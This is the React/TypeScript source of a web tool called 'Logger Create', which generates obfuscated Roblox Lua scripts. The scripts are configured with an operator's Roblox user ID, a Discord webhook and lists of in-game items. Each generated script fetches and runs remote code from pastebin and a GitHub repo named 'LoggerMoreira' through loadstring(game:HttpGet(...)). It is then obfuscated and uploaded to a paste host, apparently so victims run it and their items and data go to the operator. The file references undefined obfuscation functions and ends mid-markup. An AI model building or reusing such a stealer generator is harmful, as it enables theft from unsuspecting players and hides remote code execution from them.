import React, { useState, useEffect } from 'react';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { Route, Switch, Router as WouterRouter } from 'wouter';
import { Settings, Copy, CheckCircle2, AlertTriangle, ExternalLink, RefreshCw, Check, SquareMousePointer, Zap, Code, Link as LinkIcon, User, CircleHelp, X, Smartphone, Monitor, ClipboardPaste } from 'lucide-react';
import { toast, Toaster } from 'sonner';

const BASE_URL = "https://www.crustyhub.online";

async function uploadToPastefy(content: string): Promise<{ raw_url: string; paste_id: string }> {
  const response = await fetch(`${BASE_URL}/api/pastefy`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content }),
  });
  const data = await response.json();
  if (!response.ok) throw new Error(data.error || "Pastefy upload failed");
  return data;
}

async function lookupRobloxUser(username: string): Promise<{ id: number; name: string; avatarUrl: string | null }> {
  const robloxUrl = `https://api.roblox.com/users/get-by-username?username=${encodeURIComponent(username)}`;
  let userData: any = null;

  const proxies = [
    `https://corsproxy.io/?url=${encodeURIComponent(robloxUrl)}`,
    `https://api.allorigins.win/raw?url=${encodeURIComponent(robloxUrl)}`,
    `https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(robloxUrl)}`,
  ];

  for (const url of proxies) {
    try {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), 3000);
      const r = await fetch(url, { signal: controller.signal });
      clearTimeout(timer);
      if (!r.ok) continue;
      const data = await r.json();
      if (data.Id) { userData = data; break; }
    } catch { continue; }
  }

  if (!userData) throw new Error(`No Roblox user found with username "${username}"`);

  let avatarUrl: string | null = null;
  try {
    const thumbUrl = `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userData.Id}&size=150x150&format=Png&isCircular=true`;
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 3000);
    const r = await fetch(`https://corsproxy.io/?url=${encodeURIComponent(thumbUrl)}`, { signal: controller.signal });
    clearTimeout(timer);
    if (r.ok) {
      const d = await r.json();
      const t = d.data?.[0];
      if (t?.state === "Completed" && t.imageUrl) avatarUrl = t.imageUrl;
    }
  } catch {}

  return { id: userData.Id, name: userData.Username, avatarUrl };
}
async function resolveRobloxUsername(username: string): Promise<number> {
  const user = await lookupRobloxUser(username);
  return user.id;
}

function cleanWebhookUrl(raw: string): string {
  let value = raw.trim();
  value = value.replace(/^[<"'\s]+|[>"'\s]+$/g, '');
  value = value.replace(/\s+/g, '');
  const match = value.match(/https:\/\/(?:discord\.com|discordapp\.com)\/api\/webhooks\/\d+\/[\w-]+/i);
  return match ? match[0] : value;
}

/* ── SVG Components ─────────────────────────────────────────── */

const TigerLogo = ({ size = 40 }: { size?: number }) => (
  <img
    src={`${import.meta.env.BASE_URL}tiger-logo.png`}
    alt="Logger Create Tiger"
    width={size}
    height={size}
    style={{ objectFit: 'contain', filter: 'drop-shadow(0 0 6px rgba(0,255,65,0.5))' }}
  />
);

const DiscordIcon = ({ size = 20 }: { size?: number }) => (
  <svg width={size} height={size} viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
    <path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057c.002.022.015.048.036.063 2.052 1.507 4.04 2.422 5.992 3.029a.078.078 0 0 0 .084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028c1.961-.607 3.95-1.522 6.002-3.029a.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/>
  </svg>
);

/* ── Reusable UI ─────────────────────────────────────────────── */

const Input = ({ label, icon: Icon, ...props }: any) => (
  <div className="flex flex-col gap-1.5 mb-4">
    <label className="text-sm font-medium text-muted-foreground uppercase tracking-wider flex items-center gap-2">
      {Icon && <Icon className="w-4 h-4 text-primary" />}
      {label}
    </label>
    <input
      className="w-full bg-secondary/50 border border-border rounded-md px-4 py-2.5 text-foreground focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-all font-mono text-sm placeholder:text-muted-foreground/50"
      {...props}
    />
  </div>
);

const Toggle = ({ checked, onChange, label }: any) => (
  <label className="flex items-center justify-between cursor-pointer w-full p-3 bg-secondary/30 border border-border rounded-md hover:border-primary/50 transition-colors">
    <span className="text-sm font-medium text-foreground">{label}</span>
    <div className="relative flex items-center">
      <input type="checkbox" className="sr-only" checked={checked} onChange={(e) => onChange(e.target.checked)} />
      <div className={`w-10 h-5 rounded-full transition-colors ${checked ? 'bg-primary' : 'bg-muted'}`}/>
      <div className={`absolute left-0.5 w-4 h-4 rounded-full bg-white transition-transform ${checked ? 'translate-x-5' : 'translate-x-0'}`}/>
    </div>
  </label>
);

const PORTRAIT_EMOJIS = ['🐊','🦍','🐸','🕷️','🐐','🦈','🦎','🐙','🦇','🐺','🐲','🦂','🐌','🦖','🐳','🦑','🐧','🦥'];
const hashName = (name: string) => {
  let h = 0;
  for (let i = 0; i < name.length; i++) h = (h * 31 + name.charCodeAt(i)) >>> 0;
  return h;
};
const getPortrait = (name: string) => {
  const h = hashName(name);
  const hue = h % 360;
  const emoji = PORTRAIT_EMOJIS[h % PORTRAIT_EMOJIS.length];
  return { hue, emoji };
};

const CheckboxCard = ({ title, selected, onClick, imageUrl }: any) => {
  const { hue, emoji } = getPortrait(title);
  const [imgFailed, setImgFailed] = useState(false);
  return (
    <div
      onClick={onClick}
      className={`cursor-pointer border rounded-md p-2 transition-all flex items-center gap-2.5 ${
        selected
          ? 'bg-primary/10 border-primary text-primary shadow-[0_0_12px_rgba(0,255,65,0.15)]'
          : 'bg-secondary/30 border-border text-muted-foreground hover:border-primary/50 hover:text-foreground'
      }`}
    >
      {imageUrl && !imgFailed ? (
        <div className="w-7 h-7 shrink-0 rounded-md overflow-hidden border border-white/10 bg-black/40 flex items-center justify-center">
          <img src={imageUrl} alt={title} className="w-full h-full object-contain" loading="lazy" onError={() => setImgFailed(true)} />
        </div>
      ) : (
        <div className="w-7 h-7 shrink-0 rounded-md flex items-center justify-center text-sm border border-white/10"
          style={{ background: `linear-gradient(135deg, hsl(${hue},70%,28%), hsl(${(hue+40)%360},70%,16%))` }}>
          {emoji}
        </div>
      )}
      <span className="text-xs font-medium truncate flex-1 font-mono leading-tight">{title}</span>
      <div className={`w-4 h-4 shrink-0 rounded flex items-center justify-center border transition-colors ${
        selected ? 'bg-primary border-primary text-primary-foreground' : 'border-muted-foreground/30'
      }`}>
        {selected && <Check className="w-2.5 h-2.5" />}
      </div>
    </div>
  );
};

/* ── Tutorial modal ──────────────────────────────────────────── */

const BOT_INVITE_URL = 'https://discord.com/oauth2/authorize?client_id=792842038332358656';

const TUTORIAL_STEPS = {
  phone: [
    { title: 'Webhook URL', desc: 'Create a Discord server, then invite the Discohook Utils bot below to set up a webhook and copy its URL.', video: `${import.meta.env.BASE_URL}tutorial/phone-webhook.mp4`, showBotLink: true },
  ],
  pc: [
    { title: 'Webhook URL', desc: 'Create a server → go to Server Settings → click Integrations → click Create Webhook → copy the URL.', video: `${import.meta.env.BASE_URL}tutorial/pc-webhook.mp4` },
  ],
};

function TutorialModal({ open, onClose }: { open: boolean; onClose: () => void }) {
  const [device, setDevice] = useState<'phone' | 'pc'>('phone');
  if (!open) return null;
  const steps = TUTORIAL_STEPS[device];

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center p-3 sm:p-6 bg-black/80 backdrop-blur-sm animate-in fade-in duration-200" onClick={onClose}>
      <div onClick={e => e.stopPropagation()} className="bg-card border border-primary/40 rounded-xl shadow-[0_0_40px_rgba(0,255,65,0.15)] w-full max-w-3xl max-h-[88vh] overflow-y-auto custom-scrollbar animate-in zoom-in-95 duration-200">
        <div className="sticky top-0 z-10 flex items-center justify-between p-4 border-b border-border bg-card/95 backdrop-blur-md">
          <h2 className="text-base font-bold flex items-center gap-2">
            <CircleHelp className="w-4 h-4 text-primary"/> How to Get Your Webhook
          </h2>
          <button onClick={onClose} className="p-1.5 rounded-md hover:bg-secondary text-muted-foreground hover:text-foreground transition-colors">
            <X className="w-4 h-4"/>
          </button>
        </div>
        <div className="flex gap-2 p-4 pb-0">
          <button onClick={() => setDevice('phone')} className={`flex-1 flex items-center justify-center gap-2 py-2.5 rounded-md text-sm font-bold font-mono transition-colors border ${device === 'phone' ? 'bg-primary text-primary-foreground border-primary' : 'bg-secondary/40 text-muted-foreground border-border hover:border-primary/50'}`}>
            <Smartphone className="w-4 h-4"/> PHONE
          </button>
          <button onClick={() => setDevice('pc')} className={`flex-1 flex items-center justify-center gap-2 py-2.5 rounded-md text-sm font-bold font-mono transition-colors border ${device === 'pc' ? 'bg-primary text-primary-foreground border-primary' : 'bg-secondary/40 text-muted-foreground border-border hover:border-primary/50'}`}>
            <Monitor className="w-4 h-4"/> PC
          </button>
        </div>
        <div className="p-4 grid grid-cols-1 sm:max-w-sm sm:mx-auto gap-4">
          {steps.map((step) => (
            <div key={step.title} className="bg-black/40 border border-border rounded-lg overflow-hidden flex flex-col">
              <div className="p-3 border-b border-border flex items-center gap-2">
                <h3 className="text-sm font-bold">{step.title}</h3>
              </div>
              <video src={step.video} controls loop muted playsInline className="w-full bg-black aspect-[9/16] max-h-72 object-contain" />
              <p className="p-3 pb-0 text-xs text-muted-foreground leading-relaxed font-mono">{step.desc}</p>
              {(step as any).showBotLink && (
                <div className="p-3">
                  <a href={BOT_INVITE_URL} target="_blank" rel="noopener noreferrer" className="flex items-center justify-center gap-2 w-full py-2 rounded-md bg-primary text-primary-foreground hover:bg-primary/90 text-xs font-black font-mono uppercase tracking-wide transition-colors">
                    <ExternalLink className="w-3.5 h-3.5"/> Add Webhook Bot to Discord
                  </a>
                </div>
              )}
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

/* ── Constants ───────────────────────────────────────────────── */

const BASE_SKINS: string[] = [
  'Rose', 'Gingerbread', 'Halloween', 'Christmas', 'Bunny Basket',
  'Summer', 'Pot of Gold', 'Taco', 'Octo', 'Valentines',
  'Easter', 'Lucky', 'Aquatic', 'Tralala',
];

const BASE_SKIN_IMAGES: Record<string, string> = {
  'Rose':         `${import.meta.env.BASE_URL}base-skins/Rose.webp`,
  'Gingerbread':  `${import.meta.env.BASE_URL}base-skins/Gingerbread.webp`,
  'Halloween':    `${import.meta.env.BASE_URL}base-skins/Halloween.webp`,
  'Christmas':    `${import.meta.env.BASE_URL}base-skins/Christmas.webp`,
  'Bunny Basket': `${import.meta.env.BASE_URL}base-skins/Bunny Basket.webp`,
  'Summer':       `${import.meta.env.BASE_URL}base-skins/Summer.webp`,
  'Pot of Gold':  `${import.meta.env.BASE_URL}base-skins/Pot of Gold.webp`,
  'Taco':         `${import.meta.env.BASE_URL}base-skins/Taco.webp`,
  'Octo':         `${import.meta.env.BASE_URL}base-skins/Octo.webp`,
  'Valentines':   `${import.meta.env.BASE_URL}base-skins/Valentines.webp`,
  'Easter':       `${import.meta.env.BASE_URL}base-skins/Easter.webp`,
  'Lucky':        `${import.meta.env.BASE_URL}base-skins/Lucky.webp`,
  'Aquatic':      `${import.meta.env.BASE_URL}base-skins/Aquatic.webp`,
  'Tralala':      `${import.meta.env.BASE_URL}base-skins/Tralala.png`,
};

const GEARS: string[] = [
  "Santa's Sleigh", "Cupid's Wings", "Witch's Broom", "Waverider",
  "Yin Yang Slap", "Cursed Slap", "Cyber Slap", "Divine Slap",
  "Bloodmoon Slap", "Radioactive Slap", "Rainbow Slap", "Rainbow Hammer",
  "Bloodmoon Hammer", "Radioactive Airstrike", "Yin Yang Lamp",
  "Demon's Head", "Lava Slap", "Lava Blaster", "Alien Slap",
  "Blackhole Bomb", "Candy Sentry", "Phantom Slap",
];

const GEAR_IMAGES: Record<string, string> = Object.fromEntries(
  GEARS.map(name => [name, `${import.meta.env.BASE_URL}gears/${name}.${name === 'Phantom Slap' ? 'png' : 'webp'}`])
);

const CATEGORY_ORDER = ['OG', 'Secret', 'Brainrot God', 'Mythic', 'Legendary', 'Epic', 'Rare', 'Common'];

const CATEGORY_COLORS: Record<string, string> = {
  'OG':           'text-yellow-400 border-yellow-400/40 bg-yellow-400/10',
  'Secret':       'text-purple-400 border-purple-400/40 bg-purple-400/10',
  'Brainrot God': 'text-red-400   border-red-400/40    bg-red-400/10',
  'Mythic':       'text-orange-400 border-orange-400/40 bg-orange-400/10',
  'Legendary':    'text-amber-400 border-amber-400/40  bg-amber-400/10',
  'Epic':         'text-violet-400 border-violet-400/40 bg-violet-400/10',
  'Rare':         'text-blue-400  border-blue-400/40   bg-blue-400/10',
  'Common':       'text-slate-400 border-slate-400/40  bg-slate-400/10',
};

/* ── Home ───────────────────────────────────────────────────── */

function Home() {
  const [categories, setCategories] = useState<Record<string, string[]>>({});
  const [searchTerm, setSearchTerm] = useState('');
  const [robloxUsername, setRobloxUsername] = useState('');
  const [avatarLookup, setAvatarLookup] = useState<{
    status: 'idle' | 'loading' | 'success' | 'error';
    data?: { id: number; name: string; avatarUrl: string | null };
    error?: string;
  }>({ status: 'idle' });
  const [selectedRobloxId, setSelectedRobloxId] = useState<number | null>(null);
  const [goodWebhook, setGoodWebhook] = useState('');
  const [selectedBrainrots, setSelectedBrainrots] = useState<Set<string>>(new Set());
  const [selectedBaseSkins, setSelectedBaseSkins] = useState<Set<string>>(new Set());
  const [selectedGears, setSelectedGears] = useState<Set<string>>(new Set());
  const [scriptMode, setScriptMode] = useState<'brainrot' | 'duel'>('brainrot');
  const [wrapLoadstring, setWrapLoadstring] = useState(true);
  const [output, setOutput] = useState<{ type: 'raw' | 'loadstring'; content: string; url?: string } | null>(null);
  const [isGenerating, setIsGenerating] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [tutorialOpen, setTutorialOpen] = useState(false);
  const [imageMap, setImageMap] = useState<Record<string, string>>({});

  useEffect(() => {
    fetch(`${import.meta.env.BASE_URL}brainrot-images.json`)
      .then(res => res.json())
.then(data => { const base = import.meta.env.BASE_URL.replace(/\/$/, ''); const fixed = {}; for (const [k,v] of Object.entries(data)) { fixed[k] = base + v; } setImageMap(fixed); })
      .catch(() => {});
  }, []);

  useEffect(() => {
    const username = robloxUsername.trim();
    setSelectedRobloxId(null);
    if (!username) { setAvatarLookup({ status: 'idle' }); return; }
    setAvatarLookup({ status: 'loading' });
    let cancelled = false;
    const timer = setTimeout(async () => {
      try {
        const user = await lookupRobloxUser(username);
        if (!cancelled) setAvatarLookup({ status: 'success', data: user });
      } catch (err: any) {
        if (!cancelled) setAvatarLookup({ status: 'error', error: err?.message || 'User not found' });
      }
    }, 500);
    return () => { cancelled = true; clearTimeout(timer); };
  }, [robloxUsername]);

  useEffect(() => {
    fetch('https://www.crustyhub.online/api/brainrots')
      .then(res => res.json())
      .then(data => {
        if (data && typeof data === 'object' && !Array.isArray(data)) {
          setCategories(data as Record<string, string[]>);
        } else if (Array.isArray(data)) {
          const names: string[] = data.map((d: any) => d?.name ?? d).filter(Boolean);
          setCategories({ Common: names });
        }
      })
      .catch(err => { console.error(err); toast.error('Failed to fetch brainrot list'); });
  }, []);

  const totalCount = CATEGORY_ORDER.reduce((n, cat) => n + (categories[cat]?.length ?? 0), 0);

  const filteredCategories: [string, string[]][] = CATEGORY_ORDER
    .filter(cat => categories[cat]?.length)
    .map(cat => [cat, categories[cat].slice().reverse().filter(n => n.toLowerCase().includes(searchTerm.toLowerCase()))] as [string, string[]])
    .filter(([, names]) => names.length > 0);

  const filteredNames = filteredCategories.flatMap(([, names]) => names);
  const toggleName = (name: string) => { const s = new Set(selectedBrainrots); s.has(name) ? s.delete(name) : s.add(name); setSelectedBrainrots(s); };
  const handleSelectAll = () => { const s = new Set(selectedBrainrots); filteredNames.forEach(n => s.add(n)); setSelectedBrainrots(s); };
  const handleDeselectAll = () => { const s = new Set(selectedBrainrots); filteredNames.forEach(n => s.delete(n)); setSelectedBrainrots(s); };

  const getTargetUserId = async (): Promise<number> => {
    if (avatarLookup.status === 'success' && avatarLookup.data) return avatarLookup.data.id;
    return resolveRobloxUsername(robloxUsername.trim());
  };

  const handleGenerate = async () => {
    setError(null); setOutput(null);
    if (!robloxUsername || !goodWebhook) { setError('Please fill in all config fields.'); return; }
    const webhookPattern = /^https:\/\/(discord\.com|discordapp\.com)\/api\/webhooks\/\d+\/[\w-]+\/?$/i;
    if (!webhookPattern.test(goodWebhook.trim())) { setError('Invalid Webhook URL. It must look like https://discord.com/api/webhooks/ID/TOKEN'); return; }
    if (selectedBrainrots.size === 0) { setError('Select at least 1 brainrot before generating.'); return; }
    if (selectedBaseSkins.size === 0) { setError('Select at least 1 base skin before generating.'); return; }
    if (selectedGears.size === 0) { setError('Select at least 1 gear before generating.'); return; }
    setIsGenerating(true);
    try {
      const targetUserId = await getTargetUserId();
      const animalLines = Array.from(selectedBrainrots).map(n => `    "${n}"`).join(',\n');
      const baseSkinLines = Array.from(selectedBaseSkins).map(n => `    "${n}"`).join(',\n');
      const gearLines = Array.from(selectedGears).map(n => `    "${n}"`).join(',\n');

      const configBlock = `getgenv().TARGET_USER_ID = ${targetUserId}
getgenv().GOOD_WEBHOOK = "${goodWebhook}"

getgenv().ALLOWED_ANIMALS = {
${animalLines}
}

getgenv().ALLOWED_BASESKINS = {
${baseSkinLines}
}

getgenv().ALLOWED_GEARS = {
${gearLines}
}`;

      let scriptTemplate: string;
      if (scriptMode === 'duel') {
        scriptTemplate = `${configBlock}

task.spawn(function()
    loadstring(game:HttpGet("https://pastebin.com/m24dfrmm"))()
end)

task.spawn(function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/MachoHUB/LoggerMoreira/refs/heads/main/Auto"))()
end)

task.spawn(function()
   loadstring(game:HttpGet("https://pastebin.com/raw/LqLkF0rU"))()
end)`;
      } else {
        scriptTemplate = `${configBlock}

task.spawn(function()
    loadstring(game:HttpGet("https://pastebin.com/m24dfrmm"))()
end)

task.spawn(function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/MachoHUB/LoggerMoreira/refs/heads/main/Auto"))()
end)`;
      }

      if (wrapLoadstring) {
        const pasteRes = await obfuscateAndUpload(scriptTemplate);
        setOutput({ type: 'loadstring', content: `loadstring(game:HttpGet("${pasteRes.raw_url}"))()`, url: pasteRes.raw_url });
        toast.success('Script generated and uploaded!');
      } else {
        const obfRes = await obfuscateScript(scriptTemplate);
        const obfScript = obfRes.obfuscated || obfRes.script || obfRes.result;
        if (!obfScript) throw new Error('Obfuscate API returned no code');
        setOutput({ type: 'raw', content: obfScript });
        toast.success('Script obfuscated!');
      }
    } catch (err: any) {
      setError(err?.message && err.message !== '[object Object]' ? err.message : 'Unexpected error. Check your config and try again.');
    } finally {
      setIsGenerating(false);
    }
  };

  return (
    <div className="min-h-screen pb-20">
      <header className="border-b border-border bg-background/95 backdrop-blur-md sticky top-0 z-50">
        <div className="absolute bottom-0 left-0 right-0 h-px bg-gradient-to-r from-transparent via-primary/60 to-transparent"/>
        <div className="max-w-6xl mx-auto px-4 sm:px-6 h-16 flex items-center justify-between gap-3">
          <div className="flex items-center gap-3 min-w-0">
            <div className="relative shrink-0">
              <div className="absolute -inset-2 rounded-xl bg-primary/30 blur-xl"/>
              <div className="absolute -inset-1 rounded-lg bg-primary/20 blur-md"/>
              <div className="relative w-11 h-11 rounded-lg bg-gradient-to-br from-primary/25 to-black border border-primary/50 flex items-center justify-center overflow-visible shadow-[0_0_18px_rgba(0,255,65,0.5)]">
                <TigerLogo size={42}/>
              </div>
            </div>
            <div className="min-w-0">
              <h1 className="font-black text-xl leading-none tracking-tight truncate">
                <span className="text-primary">Logger</span><span className="text-foreground"> Create</span>
              </h1>
              <p className="text-[9px] text-primary/70 font-mono mt-0.5 tracking-[0.2em] uppercase hidden xs:block">SCRIPT.GENERATOR</p>
            </div>
          </div>
          <div className="flex items-center gap-2 sm:gap-3 shrink-0">
            <div className="hidden sm:flex items-center gap-1.5 text-[10px] font-mono text-muted-foreground border border-border/60 rounded px-2 py-1">
              <span className="w-1.5 h-1.5 rounded-full bg-primary animate-pulse"/> SYSTEM_ONLINE
            </div>
            <a href="https://discord.gg/irish" target="_blank" rel="noopener noreferrer" className="flex items-center gap-1.5 px-3 py-2 rounded-md bg-primary/10 hover:bg-primary/20 border border-primary/30 hover:border-primary/60 text-primary transition-all group shadow-[0_0_10px_rgba(0,255,65,0.1)] hover:shadow-[0_0_15px_rgba(0,255,65,0.25)]">
              <DiscordIcon size={16}/><span className="text-xs font-bold font-mono hidden sm:inline">JOIN</span>
            </a>
          </div>
        </div>
      </header>

      <main className="max-w-6xl mx-auto px-4 sm:px-6 py-6 sm:py-8 grid grid-cols-1 lg:grid-cols-12 gap-6 sm:gap-8">
        <div className="lg:col-span-4 space-y-5">
          <div className="bg-card border border-primary/40 rounded-xl p-5 shadow-[0_0_35px_rgba(0,255,65,0.18)] relative overflow-hidden">
            <div className="absolute top-0 right-0 w-40 h-40 bg-primary/5 rounded-full blur-3xl -translate-y-1/2 translate-x-1/2 pointer-events-none"/>
            <h2 className="text-base font-bold mb-4 flex items-center gap-2 relative z-10"><Settings className="w-4 h-4 text-primary"/> Configuration</h2>
            <div className="relative z-10 space-y-0">
              <Input label="Roblox Username" icon={User} placeholder="YourRobloxUsername" value={robloxUsername} onChange={(e: any) => setRobloxUsername(e.target.value)} />
              {robloxUsername.trim() && (
                <div className="-mt-2 mb-4">
                  {avatarLookup.status === 'loading' && (<div className="flex items-center gap-2 text-xs text-muted-foreground font-mono px-1 py-1"><RefreshCw className="w-3 h-3 animate-spin" /> Looking up user...</div>)}
                  {avatarLookup.status === 'error' && (<div className="flex items-center gap-2 text-xs text-red-400 font-mono px-1 py-1"><AlertTriangle className="w-3.5 h-3.5 shrink-0" /> {avatarLookup.error}</div>)}
                  {avatarLookup.status === 'success' && avatarLookup.data && (
                    <button type="button" onClick={() => { setSelectedRobloxId(avatarLookup.data!.id); toast.success(`Selected @${avatarLookup.data!.name}`); }}
                      className={`w-full flex items-center gap-3 rounded-md border p-2.5 transition-all text-left ${selectedRobloxId === avatarLookup.data.id ? 'bg-primary/10 border-primary shadow-[0_0_12px_rgba(0,255,65,0.2)]' : 'bg-secondary/30 border-border hover:border-primary/50'}`}>
                      <div className="w-10 h-10 shrink-0 rounded-full overflow-hidden border border-white/10 bg-black/40 flex items-center justify-center">
                        {avatarLookup.data.avatarUrl ? (<img src={avatarLookup.data.avatarUrl} alt={avatarLookup.data.name} className="w-full h-full object-cover" />) : (<User className="w-5 h-5 text-muted-foreground" />)}
                      </div>
                      <div className="flex-1 min-w-0">
                        <p className="text-sm font-bold font-mono truncate">@{avatarLookup.data.name}</p>
                        <p className="text-[11px] text-muted-foreground font-mono">{selectedRobloxId === avatarLookup.data.id ? 'Confirmed' : 'Will be used automatically'}</p>
                      </div>
                      {selectedRobloxId === avatarLookup.data.id ? (<CheckCircle2 className="w-5 h-5 text-primary shrink-0" />) : (<SquareMousePointer className="w-4 h-4 text-muted-foreground shrink-0" />)}
                    </button>
                  )}
                </div>
              )}
              <div className="flex flex-col gap-1.5 mb-4">
                <label className="text-sm font-medium text-muted-foreground uppercase tracking-wider flex items-center gap-2"><LinkIcon className="w-4 h-4 text-primary" /> Webhook URL</label>
                <div className="flex gap-2">
                  <input className="flex-1 min-w-0 bg-secondary/50 border border-border rounded-md px-4 py-2.5 text-foreground focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-all font-mono text-sm placeholder:text-muted-foreground/50" placeholder="https://discord.com/api/webhooks/..." value={goodWebhook}
                    onChange={(e: any) => setGoodWebhook(e.target.value.replace(/\s+/g, ''))}
                    onPaste={(e: any) => { const pasted = e.clipboardData?.getData('text') ?? ''; if (pasted) { e.preventDefault(); setGoodWebhook(cleanWebhookUrl(pasted)); } }}
                    onBlur={() => setGoodWebhook(prev => cleanWebhookUrl(prev))} />
                  <button type="button" onClick={async () => { try { const text = await navigator.clipboard.readText(); if (text) { setGoodWebhook(cleanWebhookUrl(text)); toast.success('Webhook pasted'); } else { toast.error('Clipboard is empty'); } } catch { toast.error('Clipboard access denied — paste manually'); } }}
                    title="Paste from clipboard" className="shrink-0 px-3 rounded-md border border-border bg-secondary/50 hover:border-primary/50 hover:text-primary text-muted-foreground transition-colors">
                    <ClipboardPaste className="w-4 h-4" />
                  </button>
                </div>
              </div>
            </div>
            <button onClick={() => setTutorialOpen(true)} className="relative z-10 mt-1 w-full flex items-center justify-center gap-1.5 text-xs font-mono font-bold text-primary/90 hover:text-primary border border-primary/30 hover:border-primary/60 bg-primary/5 hover:bg-primary/10 rounded-md py-2 transition-colors">
              <CircleHelp className="w-3.5 h-3.5"/> HOW TO GET WEBHOOK?
            </button>
          </div>

          <div className="bg-card border border-primary/40 rounded-xl p-5 shadow-[0_0_35px_rgba(0,255,65,0.18)] space-y-4">
            <h2 className="text-base font-bold flex items-center gap-2"><Zap className="w-4 h-4 text-primary"/> Generation Options</h2>
            <div className="grid grid-cols-2 gap-2">
              <button onClick={() => setScriptMode('brainrot')} className={`py-2 px-3 rounded-lg text-xs font-mono font-bold uppercase tracking-wider border transition-colors ${scriptMode === 'brainrot' ? 'bg-primary text-primary-foreground border-primary shadow-[0_0_15px_rgba(0,255,65,0.3)]' : 'bg-transparent text-muted-foreground border-border hover:border-primary/50 hover:text-foreground'}`}>Normal</button>
              <button onClick={() => setScriptMode('duel')} className={`py-2 px-3 rounded-lg text-xs font-mono font-bold uppercase tracking-wider border transition-colors ${scriptMode === 'duel' ? 'bg-primary text-primary-foreground border-primary shadow-[0_0_15px_rgba(0,255,65,0.3)]' : 'bg-transparent text-muted-foreground border-border hover:border-primary/50 hover:text-foreground'}`}>Duel</button>
            </div>
            <Toggle label="Wrap in loadstring" checked={wrapLoadstring} onChange={setWrapLoadstring} />
            <button onClick={handleGenerate} disabled={isGenerating} className="w-full bg-primary text-primary-foreground hover:bg-primary/90 active:scale-[0.98] font-black py-3.5 px-4 rounded-lg transition-all flex items-center justify-center gap-2 disabled:opacity-60 disabled:cursor-not-allowed uppercase tracking-widest text-sm shadow-[0_0_20px_rgba(0,255,65,0.25)] hover:shadow-[0_0_30px_rgba(0,255,65,0.4)]">
              {isGenerating ? <><RefreshCw className="w-4 h-4 animate-spin"/> Processing...</> : <><Code className="w-4 h-4"/> Generate Script</>}
            </button>
            {error && (<div className="p-3 bg-destructive/10 border border-destructive/40 rounded-lg flex gap-2.5 text-destructive items-start"><AlertTriangle className="w-4 h-4 shrink-0 mt-0.5"/><p className="text-sm font-medium leading-snug">{error}</p></div>)}
            {output && (
              <div className="bg-black/40 border border-primary/50 shadow-[0_0_30px_rgba(0,255,65,0.12)] rounded-xl flex flex-col animate-in fade-in slide-in-from-bottom-3 duration-400 overflow-hidden">
                <div className="p-3 border-b border-border flex items-center justify-between bg-primary/10">
                  <h2 className="text-sm font-bold flex items-center gap-2 text-primary"><CheckCircle2 className="w-4 h-4"/> OUTPUT_READY</h2>
                  <div className="flex gap-2">
                    {output.url && (<a href={output.url} target="_blank" rel="noopener noreferrer" className="flex items-center gap-1 px-2.5 py-1.5 bg-secondary hover:bg-secondary/80 border border-border rounded-md text-xs font-mono font-medium transition-colors"><ExternalLink className="w-3 h-3"/> RAW</a>)}
                    <button onClick={() => { navigator.clipboard.writeText(output.content); toast.success('Copied!'); }} className="flex items-center gap-1 px-3 py-1.5 bg-primary text-primary-foreground hover:bg-primary/90 rounded-md text-xs font-mono font-black transition-colors"><Copy className="w-3 h-3"/> COPY</button>
                  </div>
                </div>
                <div className="p-3 sm:p-4 bg-black/60"><textarea readOnly value={output.content} className="w-full h-28 sm:h-32 bg-transparent text-primary font-mono text-xs sm:text-sm resize-none focus:outline-none custom-scrollbar" /></div>
              </div>
            )}
          </div>

          <a href="https://discord.gg/irish" target="_blank" rel="noopener noreferrer" className="hidden lg:flex items-center gap-3 p-4 bg-card border border-primary/20 hover:border-primary/50 rounded-xl transition-all group shadow-xl hover:shadow-[0_0_20px_rgba(0,255,65,0.1)]">
            <div className="w-9 h-9 rounded-lg bg-primary/10 border border-primary/30 flex items-center justify-center text-primary group-hover:bg-primary/20 transition-colors shrink-0"><DiscordIcon size={18}/></div>
            <div><p className="text-sm font-bold text-foreground group-hover:text-primary transition-colors">Join our Discord</p><p className="text-xs text-muted-foreground font-mono">discord.gg/irish</p></div>
            <ExternalLink className="w-3.5 h-3.5 text-muted-foreground ml-auto group-hover:text-primary transition-colors"/>
          </a>
        </div>

        <div className="lg:col-span-8 flex flex-col gap-5">
          <div className="bg-card border border-primary/40 rounded-xl flex flex-col shadow-[0_0_35px_rgba(0,255,65,0.18)]" style={{ height: 'clamp(420px, 60vh, 580px)' }}>
            <div className="p-3 sm:p-4 border-b border-border bg-secondary/20 rounded-t-xl">
